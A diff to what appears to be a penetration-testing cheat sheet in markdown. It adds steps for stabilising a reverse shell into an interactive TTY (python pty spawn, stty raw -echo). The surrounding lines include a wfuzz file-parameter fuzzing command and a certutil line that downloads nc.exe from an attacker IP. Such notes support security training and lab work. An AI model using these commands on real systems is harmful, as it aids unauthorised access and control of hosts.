@@ -80,6 +80,25 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 ://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x8
 6_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP
 
+#### Making Shell Interactive - Linux 
+> 1. **In reverse shell** 
+> 1. python -c 'import pty; pty.spawn("/bin/bash")'
+> 1. python3 -c 'import pty; pty.spawn("/bin/bash")'
+> 1. Ctrl-Z
+
+> 1.  **In Attacker console**
+> 1. stty raw -echo
+> 1. fg
+
+> 1. **In reverse shell**
+> 1. reset
+> 1. export SHELL=bash
+> 1. export TERM=xterm-256color
+> 1. stty rows <num> columns <cols>; e.g stty rows 29 columns 103
+
+# In Attacker console
+stty size (to find ROWS and COLUMNS value)
+
 #### Windws Tricks
 ##### Download a file in Windows via certutil
 > 1. certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe
